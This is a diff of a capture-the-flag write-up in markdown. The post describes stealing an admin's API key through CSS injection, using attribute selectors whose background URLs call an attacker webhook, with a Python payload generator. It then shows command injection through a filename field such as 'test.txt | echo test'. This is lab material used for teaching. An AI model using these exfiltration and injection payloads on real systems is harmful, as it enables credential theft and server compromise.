@@ -122,6 +122,7 @@ The last file was `auth.js` which had:
 ## Exploit Strategy
 
 Done with analysis the code.
+
 The exploit idea in my head: **force admin to visit a link → steal `X-API-Key` → start testing server responses.**
 
 ## CSS Injection
@@ -163,7 +164,6 @@ sans-serif'; background: url(https://media.giphy.com/media/SggILpMXO7Xt6/giphy.g
 ### Stealing API Keys
 Now let's use it to steal the admin's API key.
 
-API key format observed: `sk_RANDOM`.  
 With CSS injection, I could inject a full `<div>` like this.
 We used CSS selectors to exfiltrate:
 
@@ -199,7 +199,7 @@ div[data-internal-api-key^="sk_"] {
 4. So the condition = "grab any `<div>` that has `data-internal-api-key` starting with `sk_`".
 
 ## Python Script for Exfiltration
-I asked a friend his handler "macabely" to help and he wrote a script to extract the API key character by character.
+I asked a friend his handler [macabely](https://macabely.github.io/) to help and he wrote a script to extract the API key character by character.
 
 ```python
 import sys
@@ -234,18 +234,6 @@ final_payload = "'}" + "".join(payload_parts) + "/*"
 print(final_payload)
 ```
 
-Brute-forcing API key char by char: 
-```python
-payload_parts = []
-for char in CHARS:
-    leaked_part = known_prefix + char
-    url = f"//{WEBHOOK_URL.split('//')[1]}/{leaked_part}"
-    selector = f'{ID_SELECTOR}[{ATTRIBUTE_NAME}^="{leaked_part}"]'
-    rule = f'{selector}{{background:url({url});}}'
-    payload_parts.append(rule)
-final_payload = "'}" + "".join(payload_parts) + "/*"
-```
-
 It grabs the first character → then you append it like `sk_$` → rerun the script → send payload → repeat until you leak the full key.
 
 Finally, we got the full key:
@@ -254,9 +242,6 @@ Finally, we got the full key:
 
 ## Command Injection
 
-### Metadata-Stripper Package
-Investigation revealed **command injection vulnerability** in the custom package.  
-
 Now I could send requests to:
 
 **POST `/api/strip-metadata`**
@@ -264,7 +249,7 @@ Now I could send requests to:
 When sending, I got back:
 
 ```json
-{"message":"Filename processed successfully.","details":"    0 image files updated\\n    1 files weren't updated due to errors\\n"}
+{"message":"Filename processed successfully.","details":"    0 image files updated\\n    1 files weren't updated due to errors\n"}
 ```
 
 From the message I suspected **command injection**. I started testing:
@@ -278,13 +263,13 @@ From the message I suspected **command injection**. I started testing:
 2. `test.txt | echo test`
 
 ```json
-{"message":"Filename processed successfully.","details":"test\\n"}
+{"message":"Filename processed successfully.","details":"test\n"}
 ```
 
 3. `test.txt | echo flag`
 
 ```json
-{"message":"Filename processed successfully.","details":"\\n"}
+{"message":"Filename processed successfully.","details":"\n"}
 ```
 
 This means something is filtering out the word **FLAG**.
